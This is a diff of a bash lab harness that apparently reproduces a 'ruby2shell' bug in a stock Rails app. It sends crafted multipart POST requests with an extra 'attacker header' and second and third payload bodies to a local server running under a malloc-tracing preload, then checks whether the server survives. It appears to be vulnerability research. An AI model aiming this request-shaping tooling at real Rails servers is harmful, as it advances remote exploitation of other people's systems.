@@ -23,12 +23,13 @@ export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0${GEM
 EV=lab/build/evidence
 OUT="$EV/stock-rails-$TAG.out"
 LOG="$EV/stock-rails-$TAG.server.log"
-BODY="$EV/stock-rails-$TAG.body"
+BODY="${RUBY2SHELL_STOCK_BODY_FILE:-$EV/stock-rails-$TAG.body}"
 HTML="${RUBY2SHELL_STOCK_HTML:-$EV/stock-rails-$TAG.html}"
 PIDFILE="$PWD/$EV/stock-rails-$TAG.pid"
 ARM="$PWD/$EV/stock-rails-$TAG.case-arm"
 mkdir -p "$EV"
 rm -f "$ARM"
+if [ -z "${RUBY2SHELL_STOCK_BODY_FILE:-}" ]; then
 python3 - "$MODE" "$N" "$FILL" "$ORDER" "$BODY" <<'PY'
 from pathlib import Path
 import os
@@ -68,6 +69,7 @@ filler = part(b'f', fill_bytes, part_type)
 parts.extend((filler, method) if order == 'filler-first' else (method, filler))
 Path(output).write_bytes(b'\r\n'.join(parts) + b'\r\n--XB--\r\n')
 PY
+fi
 if [ ! -f "$APP/config/environment.rb" ]; then
   echo "missing stock Rails app; run lab/repro/ruby2shell-stock-rails-setup.sh" >&2
   exit 2
@@ -76,7 +78,15 @@ CURL_TRANSFER=()
 if [ "${RUBY2SHELL_STOCK_CHUNKED:-0}" = 1 ]; then
   CURL_TRANSFER=(-H 'Transfer-Encoding: chunked')
 fi
-if [ "${RUBY2SHELL_STOCK_CASE_PROBE:-0}" = 1 ]; then
+if [ -n "${RUBY2SHELL_STOCK_EXTRA_HEADER:-}" ]; then
+  # wire-shaping knob: adds one attacker header of the given value
+  CURL_TRANSFER+=(-H "X-X2Shell-Pad: $RUBY2SHELL_STOCK_EXTRA_HEADER")
+fi
+if [ "${RUBY2SHELL_STOCK_FULL_SECOND:-0}" = 1 ]; then
+  MTRACE_FD=2 MTRACE_EMIT_ARM_FILE="$ARM" MTRACE_CASE_REQUEST=$((N + 44)) \
+    MTRACE_CASE_ARM_FILE="$ARM" LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
+    "$RB" "$APP/bin/rails" server -b 127.0.0.1 -p "$PORT" --pid "$PIDFILE" > "$LOG" 2>&1 &
+elif [ "${RUBY2SHELL_STOCK_CASE_PROBE:-0}" = 1 ]; then
   MTRACE_FD=2 MTRACE_CASE_ONLY=1 MTRACE_CASE_REQUEST=$((N + 44)) \
     MTRACE_CASE_ARM_FILE="$ARM" LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
     "$RB" "$APP/bin/rails" server -b 127.0.0.1 -p "$PORT" --pid "$PIDFILE" > "$LOG" 2>&1 &
@@ -108,18 +118,43 @@ for _ in $(seq 1 300); do
   fi
   sleep 0.1
 done
-if [ "${RUBY2SHELL_STOCK_CASE_PROBE:-0}" = 1 ]; then touch "$ARM"; fi
+if [ "${RUBY2SHELL_STOCK_CASE_PROBE:-0}" = 1 ] && [ "${RUBY2SHELL_STOCK_FULL_SECOND:-0}" != 1 ]; then touch "$ARM"; fi
 TRIGGER_HTTP=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT$ROUTE" \
   -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
   "${CURL_TRANSFER[@]}" --data-binary "@$BODY" -o "$HTML" -w '%{http_code}' 2>>"$LOG")
-rm -f "$ARM"
+if [ "${RUBY2SHELL_STOCK_PROBE_SECOND:-0}" != 1 ] && [ "${RUBY2SHELL_STOCK_PROBE_THIRD:-0}" != 1 ]; then rm -f "$ARM"; fi
 if kill -0 "$PID" 2>/dev/null; then AFTER_TRIGGER=YES; else AFTER_TRIGGER=NO; fi
 ALIVE_HTTP=$(curl -s -m 5 "http://127.0.0.1:$PORT/up" -o /dev/null -w '%{http_code}' 2>>"$LOG")
+SECOND_HTTP=NA
+if [ -n "${RUBY2SHELL_STOCK_SECOND_BODY_FILE:-}" ]; then
+  if [ "${RUBY2SHELL_STOCK_FULL_SECOND:-0}" = 1 ]; then touch "$ARM"; fi
+  SECOND_HTTP=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT$ROUTE" \
+    -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
+    --data-binary "@$RUBY2SHELL_STOCK_SECOND_BODY_FILE" \
+    -o "${RUBY2SHELL_STOCK_SECOND_HTML:-$EV/stock-rails-$TAG-second.html}" \
+    -w '%{http_code}' 2>>"$LOG")
+fi
+if [ "${RUBY2SHELL_STOCK_PROBE_SECOND:-0}" = 1 ] && [ "${RUBY2SHELL_STOCK_PROBE_THIRD:-0}" != 1 ]; then rm -f "$ARM"; fi
+THIRD_HTTP=NA
+if [ -n "${RUBY2SHELL_STOCK_THIRD_BODY_FILE:-}" ]; then
+  THIRD_HTTP=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT$ROUTE" \
+    -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
+    --data-binary "@$RUBY2SHELL_STOCK_THIRD_BODY_FILE" \
+    -o "${RUBY2SHELL_STOCK_THIRD_HTML:-$EV/stock-rails-$TAG-third.html}" \
+    -w '%{http_code}' 2>>"$LOG")
+fi
+if [ "${RUBY2SHELL_STOCK_PROBE_THIRD:-0}" = 1 ]; then rm -f "$ARM"; fi
 if kill -0 "$PID" 2>/dev/null; then ALIVE=YES; else ALIVE=NO; fi
 {
   echo "== $TAG mode=$MODE ruby=$RB n=$N fill=$FILL order=$ORDER"
-  echo "ready=$READY trigger-http=$TRIGGER_HTTP alive-after-trigger=$AFTER_TRIGGER later-http=$ALIVE_HTTP process-alive=$ALIVE"
+  echo "ready=$READY trigger-http=$TRIGGER_HTTP alive-after-trigger=$AFTER_TRIGGER later-http=$ALIVE_HTTP second-http=$SECOND_HTTP third-http=$THIRD_HTTP process-alive=$ALIVE"
 } | tee "$OUT"
 if [ "$READY" != YES ] || [ "$TRIGGER_HTTP" != 404 ] || [ "$AFTER_TRIGGER" != YES ] || [ "$ALIVE_HTTP" != 200 ] || [ "$ALIVE" != YES ]; then
+  exit 1
+fi
+if [ -n "${RUBY2SHELL_STOCK_SECOND_BODY_FILE:-}" ] && [ "$SECOND_HTTP" != 404 ]; then
+  exit 1
+fi
+if [ -n "${RUBY2SHELL_STOCK_THIRD_BODY_FILE:-}" ] && [ "$THIRD_HTTP" != 404 ]; then
   exit 1
 fi
